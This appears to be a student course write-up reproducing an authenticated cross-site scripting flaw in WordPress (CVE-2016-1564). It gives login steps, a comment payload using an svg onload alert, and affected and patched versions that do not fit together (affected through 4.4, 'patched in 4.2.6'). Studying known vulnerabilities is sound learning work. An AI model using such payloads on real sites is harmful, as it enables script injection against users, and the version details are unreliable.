# Steps
#### Step 1 - Log in as admin or editor

#### Step 2 - Inject XSS
######	Comment the payload.
	http://wpdistillery.vm/<svg onload=alert(1)>




# The types / classes of vulnerabilities involved and any related CVE identifiers
#### Authenticated Cross-Site Scripting (XSS)

#### CVE-2016-1564



# Affected versions and patches
#### Affected version
###### WordPress 3.7 - 4.4 

#### Patched in
###### version 4.2.6



# Demo
![alt text](https://github.com/Mikhail-Kreytser/Cybersecurity-Week7/blob/master/XSS%203/Demo.gif "XSS Demo")

# References
#### https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2016-1564
